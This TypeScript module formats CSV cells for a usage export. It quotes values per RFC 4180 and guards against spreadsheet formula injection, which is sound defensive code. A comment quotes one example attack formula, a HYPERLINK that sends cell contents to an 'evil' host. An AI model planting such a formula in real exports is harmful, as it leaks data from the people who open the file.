/**
 * CSV formatting — pure, zero infrastructure.
 *
 * Separate from the route that streams the usage export for the same
 * reason the other pure modules are: importing the route pulls in `@/db`
 * through the auth chain, which throws without a database, and this logic
 * is worth unit-testing (it is the formula-injection guard on a file people
 * open in a spreadsheet).
 */

/**
 * One CSV cell.
 *
 * Two jobs, both necessary:
 *
 *   1. RFC 4180 quoting — a value containing a comma, a double quote or a
 *      newline must be quoted, and embedded quotes doubled. Without it a
 *      key named `Production, EU` shifts every following column.
 *
 *   2. FORMULA INJECTION — a value whose first character is `=`, `+`, `-`,
 *      `@`, tab or CR is prefixed with a single quote. This is the
 *      standard mitigation: without it, opening the export in Excel or
 *      Numbers evaluates the cell, so a model alias or any
 *      attacker-influenced string becomes `=HYPERLINK("http://evil/?d="&A1)`
 *      running on the operator's machine. Our own data is unlikely to be
 *      hostile; the cost of the guard is one character, and the cost of
 *      skipping it is an execution primitive handed to whoever can name a
 *      key.
 *
 * Note the ORDER: the formula guard runs BEFORE quoting, so a value that
 * needs both comes out quoted with the apostrophe inside it.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let s = String(value);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;

  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** A whole row. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',');
}